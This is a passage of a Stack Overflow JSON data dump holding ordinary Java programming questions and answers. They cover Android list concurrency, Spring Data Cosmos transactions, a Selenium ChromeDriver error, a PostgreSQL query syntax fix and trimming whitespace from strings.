in another list and do batch updates when size() &gt; someNumber or some timer. why bother using sortedlist\r\n\r\nsolution that seems good\r\n\r\n1) add all object into a concurrent hashmap. This solves the threading and update issues. But I still need to present a sorted list to the UI. This means batching add and remove for the sorted list. Then also calling notifydatasetChanged() from time to time to handle object state updates\r\n\r\n2) My fantasy solution that maybe exists already is to use an object that holds a concurrent sorted list where I can add, remove and update from a background thread and also bind to a recycleview adpater.","title":"Android recycle view update sort list with concurrency issue","body":"<p>I have a sorted list I would like to use to hold objects for maintaining a recycleview as usual.</p>\n<p>The api I am interfacing with passes me updates through an interface callback using multiple threads. This api can add, remove or update object state. When the app opens there is a flurry of adds, removes and updates. Then it slowes down to some degreee. This is a reverse of the typical database paradigm where the UI updates faster than the data to one where the data updates faster than the UI</p>\n<p>This seems to be an issue with the sortedList in android for several reasons.</p>\n<ol>\n<li><p>adding an item to sortedlist must be done on UI thread if updates to list are going to fully execute without simply adding to the list and swallowing the error in a background thread when trying to show the update</p>\n</li>\n<li><p>to change an object state you must first get the index. then get the item. if your multithreading then you get index errors due to race conditions and pull the wrong object</p>\n</li>\n<li><p>you can affect a list item object's state in a background thread but this still relies on a call to recalculate() or updateitem() type calls. this leads to reycleview is computing layout errors</p>\n</li>\n</ol>\n<p>Question: Which design pattern would you use to solve this issue? Below are some of my ideas</p>\n<p>solutions that seem bad</p>\n<ol>\n<li><p>Swallow errors and use a timer to call notifydatasetchanged(). This really eliminates the purpose of using the sorted list.</p>\n</li>\n<li><p>Collect updates in another list and do batch updates when size() &gt; someNumber or some timer. why bother using sortedlist</p>\n</li>\n</ol>\n<p>solution that seems good</p>\n<ol>\n<li><p>add all object into a concurrent hashmap. This solves the threading and update issues. But I still need to present a sorted list to the UI. This means batching add and remove for the sorted list. Then also calling notifydatasetChanged() from time to time to handle object state updates</p>\n</li>\n<li><p>My fantasy solution that maybe exists already is to use an object that holds a concurrent sorted list where I can add, remove and update from a background thread and also bind to a recycleview adpater.</p>\n</li>\n</ol>\n"},{"tags":["java","spring","azure","spring-data-jpa","azure-cosmosdb"],"comments":[{"owner":{"account_id":10725921,"reputation":1866,"user_id":9303470,"display_name":"Ecstasy"},"score":0,"creation_date":1639382002,"post_id":70202035,"comment_id":124325067,"body_markdown":"You can refer to [How to use @Transcational with spring-data-cosmosdb?](https://stackoverflow.com/questions/61590493/how-to-use-transcational-with-spring-data-cosmosdb). You can open an issue on GitHub: [azure-sdk-for-java](https://github.com/Azure/azure-sdk-for-java/issues)","body":"You can refer to <a href=\"https://stackoverflow.com/questions/61590493/how-to-use-transcational-with-spring-data-cosmosdb\">How to use @Transcational with spring-data-cosmosdb?</a>. You can open an issue on GitHub: <a href=\"https://github.com/Azure/azure-sdk-for-java/issues\" rel=\"nofollow noreferrer\">azure-sdk-for-java</a>"}],"answers":[{"tags":[],"owner":{"account_id":15979059,"reputation":1072,"user_id":11531156,"display_name":"RCT"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1642469662,"creation_date":1642469662,"answer_id":70749370,"question_id":70202035,"body_markdown":"Transactional batch is not supported via Spring data Cosmos. As an alternative, you can access CosmosClient from within a Spring application to leverage transactional batch capabilities. ","title":"Spring Data cosmos @Transactions support","body":"<p>Transactional batch is not supported via Spring data Cosmos. As an alternative, you can access CosmosClient from within a Spring application to leverage transactional batch capabilities.</p>\n"}],"owner":{"account_id":5681588,"reputation":43,"user_id":4492596,"display_name":"Java techBuff"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":452,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70749370,"answer_count":1,"score":0,"last_activity_date":1642469662,"creation_date":1638458344,"question_id":70202035,"body_markdown":"\r\nWith [Azure Cosmos DB transactional batch support][1] available for Cosmos Java SDK 4.7.0, Does Spring Data Cosmos allows transactional operations? \r\n\r\nI went through [Spring Data Cosmos Github Documentation][2], but didn&#39;t find a reference. \r\n\r\nNeed help if there is a way to implement transaction batch operations via spring cosmos data. If there is no way currently, then what would be the best way to proceed ?\r\n\r\n\r\n  [1]: https://azure.microsoft.com/en-us/updates/azure-cosmos-db-transactional-batch-support-for-java-sdk-470-and-above/\r\n  [2]: https://github.com/Azure/azure-sdk-for-java/tree/main/sdk/cosmos/azure-spring-data-cosmos","title":"Spring Data cosmos @Transactions support","body":"<p>With <a href=\"https://azure.microsoft.com/en-us/updates/azure-cosmos-db-transactional-batch-support-for-java-sdk-470-and-above/\" rel=\"nofollow noreferrer\">Azure Cosmos DB transactional batch support</a> available for Cosmos Java SDK 4.7.0, Does Spring Data Cosmos allows transactional operations?</p>\n<p>I went through <a href=\"https://github.com/Azure/azure-sdk-for-java/tree/main/sdk/cosmos/azure-spring-data-cosmos\" rel=\"nofollow noreferrer\">Spring Data Cosmos Github Documentation</a>, but didn't find a reference.</p>\n<p>Need help if there is a way to implement transaction batch operations via spring cosmos data. If there is no way currently, then what would be the best way to proceed ?</p>\n"},{"tags":["java","selenium","web-scraping","selenium-chromedriver"],"comments":[{"owner":{"account_id":8218769,"reputation":178,"user_id":6184107,"display_name":"Mat"},"score":0,"creation_date":1642314965,"post_id":70726743,"comment_id":125035250,"body_markdown":"Add your code snippet.","body":"Add your code snippet."},{"owner":{"account_id":22965938,"reputation":35,"user_id":17094983,"display_name":"NoobCoder"},"score":0,"creation_date":1642469648,"post_id":70726743,"comment_id":125073615,"body_markdown":"Just added it. Thanks","body":"Just added it. Thanks"}],"owner":{"account_id":22965938,"reputation":35,"user_id":17094983,"display_name":"NoobCoder"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":525,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642469638,"creation_date":1642296303,"question_id":70726743,"body_markdown":"I am trying to open chrome driver using selenium but it is giving me this error. This is the first project that this error is popping up for me as I&#39;ve had a different project that used selenium and it worked fine. I believe the error may be because of my pom.xml file. I am unsure if I&#39;m missing anything or if it is the order of dependencies I have. Here is my code: `static SortedMap&lt;String,String&gt; QuebecConsolidatedStatutesAndPDFs = new TreeMap&lt;String,String&gt;();\r\n   \r\n    public static void main(String[] args) throws InterruptedException {\r\n        System.setProperty(&quot;webdriver.chrome.driver&quot;, &quot;C:\\\\WorkSpace\\\\Driver\\\\chromedriver.exe&quot;);\r\n        WebDriver driver = new ChromeDriver();\r\n\r\n        driver.get(&quot;http://www.legisquebec.gouv.qc.ca/en/chapters?corpus=statutes&amp;selection=all&quot;);\r\n        Thread.sleep(3000);\r\n\r\n        List&lt;WebElement&gt; QuebecConsolidatedStatutes = driver.findElements(By.xpath(&quot;//body/div/div/div[2]/div/div[2]/table/tbody/tr[contains(@class, &#39;clickable&#39;)]&quot;));\r\n        \r\n        String parent = driver.getWindowHandle();\r\n        for (int i=0; i&lt;QuebecConsolidatedStatutes.size(); i++){\r\n            String opentabs = Keys.chord(Keys.CONTROL, Keys.ENTER);\r\n            \r\n\r\n            QuebecConsolidatedStatutes.get(i).sendKeys(opentabs);\r\n        \r\n        }\r\n\r\n        int i=QuebecConsolidatedStatutes.size()-1; \r\n            Set&lt;String&gt; tabs = driver.getWindowHandles();\r\n            for (String child:tabs){\r\n                if (!parent.equalsIgnoreCase(child)){\r\n                    driver.close();\r\n                    driver.switchTo().window(child);\r\n                    String StatuteName = driver.findElement(By.xpath(&quot;//*[@id=&#39;form&#39;]/div[2]/div[1]/h3/text()&quot;)).getText();\r\n                    String pagePdfUrl = driver.findElement(By.xpath(&quot;//*[@id=&#39;renditionPdf&#39;]&quot;)).getAttribute(&quot;href&quot;);\r\n                    if (i!=0){\r\n                        QuebecConsolidatedStatutesAndPDFs.put(StatuteName, pagePdfUrl);\r\n                        i-=1;\r\n                    }\r\n                    else{\r\n                        continue;\r\n                    }\r\n                }\r\n                    \r\n            }\r\n            System.out.println(QuebecConsolidatedStatutesAndPDFs);\r\n    }\r\n}` The error is the following: `cmd /C &quot;&quot;C:\\Program Files\\Java\\jdk-11.0.12\\bin\\java.exe&quot; @C:\\Users\\Nasse\\AppData\\Local\\Temp\\cp_8rv48yyid2l2bl8g8rlqdo6bn.argfile com.example.App &quot;\r\nException in thread &quot;main&quot; java.lang.AbstractMethodError: Receiver class org.openqa.selenium.chrome.ChromeDriverService$Builder does not define or inherit an implementation of the resolved method abstract createArgs()Ljava/util/List; of abstract class org.openqa.selenium.remote.service.DriverService$Builder.\r\n        at org.openqa.selenium.remote.service.DriverService$Builder.build(DriverService.java:441)\r\n        at org.openqa.selenium.chrome.ChromeDriverService.createDefaultService(ChromeDriverService.java:88)\r\n        at org.openqa.selenium.chrome.ChromeDriver.&lt;init&gt;(ChromeDriver.java:116)\r\n        at com.example.App.main(App.java:23)`","title":"Selenium Chromedriver error - receiver class does not define or inherit an implementation of the resolved method abstract createArgs()","body":"<p>I am trying to open chrome driver using selenium but it is giving me this error. This is the first project that this error is popping up for me as I've had a different project that used selenium and it worked fine. I believe the error may be because of my pom.xml file. I am unsure if I'm missing anything or if it is the order of dependencies I have. Here is my code: `static SortedMap&lt;String,String&gt; QuebecConsolidatedStatutesAndPDFs = new TreeMap&lt;String,String&gt;();</p>\n<pre><code>public static void main(String[] args) throws InterruptedException {\n    System.setProperty(&quot;webdriver.chrome.driver&quot;, &quot;C:\\\\WorkSpace\\\\Driver\\\\chromedriver.exe&quot;);\n    WebDriver driver = new ChromeDriver();\n\n    driver.get(&quot;http://www.legisquebec.gouv.qc.ca/en/chapters?corpus=statutes&amp;selection=all&quot;);\n    Thread.sleep(3000);\n\n    List&lt;WebElement&gt; QuebecConsolidatedStatutes = driver.findElements(By.xpath(&quot;//body/div/div/div[2]/div/div[2]/table/tbody/tr[contains(@class, 'clickable')]&quot;));\n    \n    String parent = driver.getWindowHandle();\n    for (int i=0; i&lt;QuebecConsolidatedStatutes.size(); i++){\n        String opentabs = Keys.chord(Keys.CONTROL, Keys.ENTER);\n        \n\n        QuebecConsolidatedStatutes.get(i).sendKeys(opentabs);\n    \n    }\n\n    int i=QuebecConsolidatedStatutes.size()-1; \n        Set&lt;String&gt; tabs = driver.getWindowHandles();\n        for (String child:tabs){\n            if (!parent.equalsIgnoreCase(child)){\n                driver.close();\n                driver.switchTo().window(child);\n                String StatuteName = driver.findElement(By.xpath(&quot;//*[@id='form']/div[2]/div[1]/h3/text()&quot;)).getText();\n                String pagePdfUrl = driver.findElement(By.xpath(&quot;//*[@id='renditionPdf']&quot;)).getAttribute(&quot;href&quot;);\n                if (i!=0){\n                    QuebecConsolidatedStatutesAndPDFs.put(StatuteName, pagePdfUrl);\n                    i-=1;\n                }\n                else{\n                    continue;\n                }\n            }\n                \n        }\n        System.out.println(QuebecConsolidatedStatutesAndPDFs);\n}\n</code></pre>\n<p>}<code>The error is the following:</code>cmd /C &quot;&quot;C:\\Program Files\\Java\\jdk-11.0.12\\bin\\java.exe&quot; @C:\\Users\\Nasse\\AppData\\Local\\Temp\\cp_8rv48yyid2l2bl8g8rlqdo6bn.argfile com.example.App &quot;\nException in thread &quot;main&quot; java.lang.AbstractMethodError: Receiver class org.openqa.selenium.chrome.ChromeDriverService$Builder does not define or inherit an implementation of the resolved method abstract createArgs()Ljava/util/List; of abstract class org.openqa.selenium.remote.service.DriverService$Builder.\nat org.openqa.selenium.remote.service.DriverService$Builder.build(DriverService.java:441)\nat org.openqa.selenium.chrome.ChromeDriverService.createDefaultService(ChromeDriverService.java:88)\nat org.openqa.selenium.chrome.ChromeDriver.(ChromeDriver.java:116)\nat com.example.App.main(App.java:23)`</p>\n"},{"tags":["java","postgresql","spring-boot"],"comments":[{"owner":{"account_id":255070,"reputation":3603,"user_id":534858,"accept_rate":75,"display_name":"Christian"},"score":2,"creation_date":1642102967,"post_id":70702186,"comment_id":124989525,"body_markdown":"It&#39;s an Psql Error. So we would need to see the executed sql. Turn on the logs and post the executed sql statement.","body":"It&#39;s an Psql Error. So we would need to see the executed sql. Turn on the logs and post the executed sql statement."},{"owner":{"account_id":11350405,"reputation":97,"user_id":8321608,"display_name":"Tyler Edmonds"},"score":0,"creation_date":1642105132,"post_id":70702186,"comment_id":124990190,"body_markdown":"Interesting. We have another query in the system I based this on and has the same concat.  I&#39;ll test out some suggested changes and we&#39;ll see.  I&#39;ll also get the executed SQL when I get back to my desk and update the question.","body":"Interesting. We have another query in the system I based this on and has the same concat.  I&#39;ll test out some suggested changes and we&#39;ll see.  I&#39;ll also get the executed SQL when I get back to my desk and update the question."},{"owner":{"account_id":11350405,"reputation":97,"user_id":8321608,"display_name":"Tyler Edmonds"},"score":0,"creation_date":1642115301,"post_id":70702186,"comment_id":124993077,"body_markdown":"@Christian - updated with executed sql and some more info.","body":"@Christian - updated with executed sql and some more info."},{"owner":{"account_id":255070,"reputation":3603,"user_id":534858,"accept_rate":75,"display_name":"Christian"},"score":0,"creation_date":1642121394,"post_id":70702186,"comment_id":124994241,"body_markdown":"seems like levels and some other fields can&#39;t be resolved. I don&#39;t think that `? in (.)` has a meaning. You need a join, or maybe it is an embedded?","body":"seems like levels and some other fields can&#39;t be resolved. I don&#39;t think that <code>? in (.)</code> has a meaning. You need a join, or maybe it is an embedded?"}],"answers":[{"tags":[],"owner":{"account_id":1386390,"reputation":320,"user_id":1318346,"display_name":"Jared Beekman"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1642113833,"creation_date":1642103624,"answer_id":70702354,"question_id":70702186,"body_markdown":" 1. &lt;s&gt;concat only takes two arguments&lt;/s&gt; You can use the `||` operator instead of concat function, but that&#39;s personal preference.\r\n 2. you&#39;re missing a space at the end of the second to the last line `(mc.levels)&quot;+`\r\n","title":"PSQLException: ERROR: syntax error at or near &quot;.&quot;","body":"<ol>\n<li><s>concat only takes two arguments</s> You can use the <code>||</code> operator instead of concat function, but that's personal preference.</li>\n<li>you're missing a space at the end of the second to the last line <code>(mc.levels)&quot;+</code></li>\n</ol>\n"}],"owner":{"account_id":11350405,"reputation":97,"user_id":8321608,"display_name":"Tyler Edmonds"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":8311,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70702354,"answer_count":1,"score":1,"last_activity_date":1642467266,"creation_date":1642102801,"question_id":70702186,"body_markdown":"I&#39;m using Java 8, Spring Boot, and PostgreSQL.\r\n\r\nI have the following query\r\n```\r\n@Query(value = &quot;select mc from MasterCourse mc &quot; +\r\n\t\t\t&quot;where mc.institution.guid = :institutionGuid or mc.consortium = true &quot; +\r\n\t\t\t&quot;and (:searchStr in (mc.tags) &quot; +\r\n\t\t\t&quot;or lower(mc.name) like concat(&#39;%&#39;, lower(:searchStr),&#39;%&#39;) &quot; +\r\n\t\t\t&quot;or lower(mc.description) like concat(&#39;%&#39;, lower(:searchStr),&#39;%&#39;) &quot; +\r\n\t\t\t&quot;or (:searchStr) in (mc.categories) &quot; +\r\n\t\t\t&quot;or (:searchStr) in (mc.levels)&quot;+\r\n\t\t\t&quot;or mc.authorGuid in (:authorGuids))&quot;\r\n```\r\nand it is giving me an error `PSQLException: ERROR: syntax error at or near &quot;.&quot;`\r\n\r\nI can&#39;t seem to figure out what is causing this.  It does not appear to be any reserved words. \r\n\r\nEdit\r\n---\r\n\r\nSo I turned on debug logs and got this executed SQL. It looks like it&#39;s not liking my `and (:searchStr in (mc.tags)`.  mc.tags appears to just be returning a (.).  I&#39;m guessing this is because of the fact that tags is a list of objects, not just strings.\r\n\r\nI&#39;m trying to match the searchStr on the &quot;name&quot; field of the tags. \r\nAny ideas on how to achieve this?\r\n\r\n```\r\nwhere mastercour0_1_.institution_id=institutio1_.id and \r\nmastercour0_.id=tags2_.master_course_id and tags2_.tag_id=tag3_.id and mastercour0_.id=categories4_.master_course_id and \r\ncategories4_.category_id=category5_.id and \r\nmastercour0_.id=levels6_.master_course_id and \r\nlevels6_.level_id=level7_.id and (institutio1_.guid=? or mastercour0_.consortium=true \r\nand (? in (.)) \r\nor lower(mastercour0_.name) like (&#39;%&#39;||lower(?)||&#39;%&#39;) \r\nor lower(mastercour0_.description) like (&#39;%&#39;||lower(?)||&#39;%&#39;) \r\nor ? in (.) or ? in (.) or mastercour0_.author_guid in (null))\r\n```\r\n\r\nEdit 2\r\n---\r\n\r\nI resolved this with the following code.  The answer provided on this question partially resolved it by finding a missing space on a line break.  The comments on my question helped point me in the right direction of some joins. \r\n```\r\n@Query(&quot;select mc from MasterCourse mc &quot; +\r\n\t\t\t&quot;left join mc.tags t &quot; +\r\n\t\t\t&quot;left join mc.categories cat &quot; +\r\n\t\t\t&quot;left join mc.levels l &quot; +\r\n\t\t\t&quot;where (mc.institution.guid = :institutionGuid or mc.consortium = true) &quot; +\r\n\t\t\t\t&quot;and (CONCAT(&#39;%&#39;,lower(:searchStr),&#39;%&#39;) like lower(t.friendly) &quot; +\r\n\t\t\t\t&quot;or CONCAT(&#39;%&#39;,lower(:searchStr),&#39;%&#39;) like lower(mc.name) &quot; +\r\n\t\t\t\t&quot;or CONCAT(&#39;%&#39;,lower(:searchStr),&#39;%&#39;) like lower(mc.description) &quot; +\r\n\t\t\t\t&quot;or CONCAT(&#39;%&#39;,lower(:searchStr),&#39;%&#39;) like lower(cat.friendly) &quot; +\r\n\t\t\t\t&quot;or CONCAT(&#39;%&#39;,lower(:searchStr),&#39;%&#39;) like lower(l.friendly) &quot;+\r\n\t\t\t\t&quot;or mc.authorGuid in (:authorGuids))&quot;\r\n\t)\r\n```","title":"PSQLException: ERROR: syntax error at or near &quot;.&quot;","body":"<p>I'm using Java 8, Spring Boot, and PostgreSQL.</p>\n<p>I have the following query</p>\n<pre><code>@Query(value = &quot;select mc from MasterCourse mc &quot; +\n            &quot;where mc.institution.guid = :institutionGuid or mc.consortium = true &quot; +\n            &quot;and (:searchStr in (mc.tags) &quot; +\n            &quot;or lower(mc.name) like concat('%', lower(:searchStr),'%') &quot; +\n            &quot;or lower(mc.description) like concat('%', lower(:searchStr),'%') &quot; +\n            &quot;or (:searchStr) in (mc.categories) &quot; +\n            &quot;or (:searchStr) in (mc.levels)&quot;+\n            &quot;or mc.authorGuid in (:authorGuids))&quot;\n</code></pre>\n<p>and it is giving me an error <code>PSQLException: ERROR: syntax error at or near &quot;.&quot;</code></p>\n<p>I can't seem to figure out what is causing this.  It does not appear to be any reserved words.</p>\n<h2>Edit</h2>\n<p>So I turned on debug logs and got this executed SQL. It looks like it's not liking my <code>and (:searchStr in (mc.tags)</code>.  mc.tags appears to just be returning a (.).  I'm guessing this is because of the fact that tags is a list of objects, not just strings.</p>\n<p>I'm trying to match the searchStr on the &quot;name&quot; field of the tags.\nAny ideas on how to achieve this?</p>\n<pre><code>where mastercour0_1_.institution_id=institutio1_.id and \nmastercour0_.id=tags2_.master_course_id and tags2_.tag_id=tag3_.id and mastercour0_.id=categories4_.master_course_id and \ncategories4_.category_id=category5_.id and \nmastercour0_.id=levels6_.master_course_id and \nlevels6_.level_id=level7_.id and (institutio1_.guid=? or mastercour0_.consortium=true \nand (? in (.)) \nor lower(mastercour0_.name) like ('%'||lower(?)||'%') \nor lower(mastercour0_.description) like ('%'||lower(?)||'%') \nor ? in (.) or ? in (.) or mastercour0_.author_guid in (null))\n</code></pre>\n<h2>Edit 2</h2>\n<p>I resolved this with the following code.  The answer provided on this question partially resolved it by finding a missing space on a line break.  The comments on my question helped point me in the right direction of some joins.</p>\n<pre><code>@Query(&quot;select mc from MasterCourse mc &quot; +\n            &quot;left join mc.tags t &quot; +\n            &quot;left join mc.categories cat &quot; +\n            &quot;left join mc.levels l &quot; +\n            &quot;where (mc.institution.guid = :institutionGuid or mc.consortium = true) &quot; +\n                &quot;and (CONCAT('%',lower(:searchStr),'%') like lower(t.friendly) &quot; +\n                &quot;or CONCAT('%',lower(:searchStr),'%') like lower(mc.name) &quot; +\n                &quot;or CONCAT('%',lower(:searchStr),'%') like lower(mc.description) &quot; +\n                &quot;or CONCAT('%',lower(:searchStr),'%') like lower(cat.friendly) &quot; +\n                &quot;or CONCAT('%',lower(:searchStr),'%') like lower(l.friendly) &quot;+\n                &quot;or mc.authorGuid in (:authorGuids))&quot;\n    )\n</code></pre>\n"},{"tags":["java","string","replace"],"comments":[{"owner":{"account_id":930925,"reputation":29855,"user_id":960828,"accept_rate":90,"display_name":"Alex D"},"score":7,"creation_date":1331541135,"post_id":6652687,"comment_id":12273693,"body_markdown":"It&#39;s unfortunate, but it means that the answers here were useful to people. I upvoted for that reason only.","body":"It&#39;s unfortunate, but it means that the answers here were useful to people. I upvoted for that reason only."},{"owner":{"account_id":114376,"reputation":8472,"user_id":300797,"accept_rate":93,"display_name":"thecoshman"},"score":12,"creation_date":1390822903,"post_id":6652687,"comment_id":32243016,"body_markdown":"Whilst this may be a duplicate, this is by far a better presented question. If anything, the other should be close as a duplicate of this one.","body":"Whilst this may be a duplicate, this is by far a better presented question. If anything, the other should be close as a duplicate of this one."},{"owner":{"account_id":3452279,"reputation":37360,"user_id":2891664,"accept_rate":100,"display_name":"Radiodef"},"score":1,"creation_date":1532354562,"post_id":6652687,"comment_id":89929969,"body_markdown":"I switched the duplicates because this Q&amp;A has far more views and favorites, and the other Q&amp;A is actually a debugging question.","body":"I switched the duplicates because this Q&amp;A has far more views and favorites, and the other Q&amp;A is actually a debugging question."},{"owner":{"account_id":1939636,"reputation":28457,"user_id":1746118,"accept_rate":95,"display_name":"Naman"},"score":1,"creation_date":1532366129,"post_id":6652687,"comment_id":89937119,"body_markdown":"Made an answer with the [solution from JDK/11 API](https://stackoverflow.com/a/51484070/1746118) - **`String.strip`** to this.","body":"Made an answer with the <a href=\"https://stackoverflow.com/a/51484070/1746118\">solution from JDK/11 API</a> - <b><code>String.strip</code></b> to this."}],"answers":[{"tags":[],"owner":{"account_id":56155,"reputation":9443,"user_id":168196,"display_name":"woliveirajr"},"down_vote_count":1,"up_vote_count":619,"is_accepted":true,"score":618,"last_activity_date":1415772395,"creation_date":1310398766,"answer_id":6652705,"question_id":6652687,"body_markdown":"You can try the trim() method.\r\n\r\n    String newString = oldString.trim();\r\n\r\nTake a look at [javadocs](https://docs.oracle.com/javase/6/docs/api/java/lang/String.html#trim())","title":"Strip Leading and Trailing Spaces From Java String","body":"<p>You can try the trim() method.</p>\n\n<pre><code>String newString = oldString.trim();\n</code></pre>\n\n<p>Take a look at <a href=\"https://docs.oracle.com/javase/6/docs/api/java/lang/String.html#trim()\" rel=\"noreferrer\">javadocs</a></p>\n"},{"tags":[],"owner":{"account_id":61630,"reputation":38237,"user_id":183579,"accept_rate":68,"display_name":"Richard H"},"down_vote_count":0,"up_vote_count":34,"is_accepted":false,"score":34,"last_activity_date":1310398816,"creation_date":1310398816,"answer_id":6652721,"question_id":6652687,"body_markdown":"From the [docs][1]:\r\n\r\n    String.trim();\r\n\r\n\r\n  [1]: http://download.oracle.com/javase/6/docs/api/java/lang/String.html#trim%28%29","title":"Strip Leading and Trailing Spaces From Java String","body":"<p>From the <a href=\"http://download.oracle.com/javase/6/docs/api/java/lang/String.html#trim%28%29\">docs</a>:</p>\n\n<pre><code>String.trim();\n</code></pre>\n"},{"tags":[],"owner":{"account_id":85597,"reputation":8269,"user_id":238546,"accept_rate":93,"display_name":"James.Xu"},"down_vote_count":1,"up_vote_count":19,"is_accepted":false,"score":18,"last_activity_date":1310398976,"creation_date":1310398976,"answer_id":6652763,"question_id":6652687,"body_markdown":"trim() is your choice, but if you want to use `replace` method -- which might be more flexiable, you can try the following:\r\n\r\n    String stripppedString = myString.replaceAll(&quot;(^ )|( $)&quot;, &quot;&quot;);","title":"Strip Leading and Trailing Spaces From Java String","body":"<p>trim() is your choice, but if you want to use <code>replace</code> method -- which might be more flexiable, you can try the following:</p>\n\n<pre><code>String stripppedString = myString.replaceAll(\"(^ )|( $)\", \"\");\n</code></pre>\n"},{"tags":[],"owner":{"account_id":277279,"reputation":62850,"user_id":571189,"display_name":"Prince John Wesley"},"down_vote_count":1,"up_vote_count":87,"is_accepted":false,"score":86,"last_activity_date":1468408164,"creation_date":1310399042,"answer_id":6652772,"question_id":6652687,"body_markdown":"Use [`String#trim()`][1] method or `String allRemoved = myString.replaceAll(&quot;^\\\\s+|\\\\s+$&quot;, &quot;&quot;)` for trim both the end.\r\n\r\nFor left trim:\r\n\r\n    String leftRemoved = myString.replaceAll(&quot;^\\\\s+&quot;, &quot;&quot;);\r\n\r\nFor right trim:\r\n\r\n    String rightRemoved = myString.replaceAll(&quot;\\\\s+$&quot;, &quot;&quot;);\r\n\r\n\r\n  [1]: http://download.oracle.com/javase/6/docs/api/java/lang/String.html#trim%28%29","title":"Strip Leading and Trailing Spaces From Java String","body":"<p>Use <a href=\"http://download.oracle.com/javase/6/docs/api/java/lang/String.html#trim%28%29\" rel=\"noreferrer\"><code>String#trim()</code></a> method or <code>String allRemoved = myString.replaceAll(\"^\\\\s+|\\\\s+$\", \"\")</code> for trim both the end.</p>\n\n<p>For left trim:</p>\n\n<pre><code>String leftRemoved = myString.replaceAll(\"^\\\\s+\", \"\");\n</code></pre>\n\n<p>For right trim:</p>\n\n<pre><code>String rightRemoved = myString.replaceAll(\"\\\\s+$\", \"\");\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1939636,"reputation":28457,"user_id":1746118,"accept_rate":95,"display_name":"Naman"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1573038300,"creation_date":1532365834,"answer_id":51484070,"question_id":6652687,"body_markdown":"With Java-11 and above, you can make use of the [**`String.strip`**](https://docs.oracle.com/en/java/javase/13/docs/api/java.base/java/lang/String.html#strip()) API to return a string whose value is this string, with all leading and trailing whitespace removed. The javadoc for the same reads :\r\n\r\n    /**\r\n     * Returns a string whose value is this string, with all leading\r\n     * and trailing {@link Character#isWhitespace(int) white space}\r\n     * removed.\r\n     * &lt;p&gt;\r\n     * If this {@code String} object represents an empty string,\r\n     * or if all code points in this string are\r\n     * {@link Character#isWhitespace(int) white space}, then an empty string\r\n     * is returned.\r\n     * &lt;p&gt;\r\n     * Otherwise, returns a substring of this string beginning with the first\r\n     * code point that is not a {@link Character#isWhitespace(int) white space}\r\n     * up to and including the last code point that is not a\r\n     * {@link Character#isWhitespace(int) white space}.\r\n     * &lt;p&gt;\r\n     * This method may be used to strip\r\n     * {@link Character#isWhitespace(int) white space} from\r\n     * the beginning and end of a string.\r\n     *\r\n     * @return  a string whose value is this string, with all leading\r\n     *          and trailing white space removed\r\n     *\r\n     * @see Character#isWhitespace(int)\r\n     *\r\n     * @since 11\r\n     */\r\n    public String strip()\r\n\r\n\r\nThe sample cases for these could be:--\r\n\r\n    System.out.println(&quot;  leading&quot;.strip()); // prints &quot;leading&quot;\r\n    System.out.println(&quot;trailing  &quot;.strip()); // prints &quot;trailing&quot;\r\n    System.out.println(&quot;  keep this  &quot;.strip()); // prints &quot;keep this&quot;","title":"Strip Leading and Trailing Spaces From Java String","body":"<p>With Java-11 and above, you can make use of the <a href=\"https://docs.oracle.com/en/java/javase/13/docs/api/java.base/java/lang/String.html#strip()\" rel=\"nofollow noreferrer\"><strong><code>String.strip</code></strong></a> API to return a string whose value is this string, with all leading and trailing whitespace removed. The javadoc for the same reads :</p>\n\n<pre><code>/**\n * Returns a string whose value is this string, with all leading\n * and trailing {@link Character#isWhitespace(int) white space}\n * removed.\n * &lt;p&gt;\n * If this {@code String} object represents an empty string,\n * or if all code points in this string are\n * {@link Character#isWhitespace(int) white space}, then an empty string\n * is returned.\n * &lt;p&gt;\n * Otherwise, returns a substring of this string beginning with the first\n * code point that is not a {@link Character#isWhitespace(int) white space}\n * up to and including the last code point that is not a\n * {@link Character#isWhitespace(int) white space}.\n * &lt;p&gt;\n * This method may be used to strip\n * {@link Character#isWhitespace(int) white space} from\n * the beginning and end of a string.\n *\n * @return  a string whose value is this string, with all leading\n *          and trailing white space removed\n *\n * @see Character#isWhitespace(int)\n *\n * @since 11\n */\npublic String strip()\n</code></pre>\n\n<p>The sample cases for these could be:--</p>\n\n<pre><code>System.out.println(\"  leading\".strip()); // prints \"leading\"\nSystem.out.println(\"trailing  \".strip()); // prints \"trailing\"\nSystem.out.println(\"  keep this  \".strip()); // prints \"keep this\"\n</code></pre>\n"},{"tags":[],"owner":{"account_id":7626755,"reputation":511,"user_id":5782985,"display_name":"Galley"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1546499820,"creation_date":1546499820,"answer_id":54017896,"question_id":6652687,"body_markdown":"To trim specific char, you can use:\r\n\r\n    String s = s.replaceAll(&quot;^(,|\\\\s)*|(,|\\\\s)*$&quot;, &quot;&quot;)\r\nHere will strip leading and trailing **space** and **comma**.","title":"Strip Leading and Trailing Spaces From Java String","body":"<p>To trim specific char, you can use:</p>\n\n<pre><code>String s = s.replaceAll(\"^(,|\\\\s)*|(,|\\\\s)*$\", \"\")\n</code></pre>\n\n<p>Here will strip leading and trailing <strong>space</strong> and <strong>comma</strong>.</p>\n"},{"tags":[],"owner":{"account_id":82939,"reputation":8206,"user_id":232867,"accept_rate":44,"display_name":"Satya"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1601719443,"creation_date":1601719443,"answer_id":64183009,"question_id":6652687,"body_markdown":"s.strip() you can use from java 11 onwards.\r\n\r\n\r\n\r\ns.trim() you can use.","title":"Strip Leading and Trailing Spaces From Java String","body":"<p>s.strip() you can use from java 11 onwards.</p>\n<p>s.trim() you can 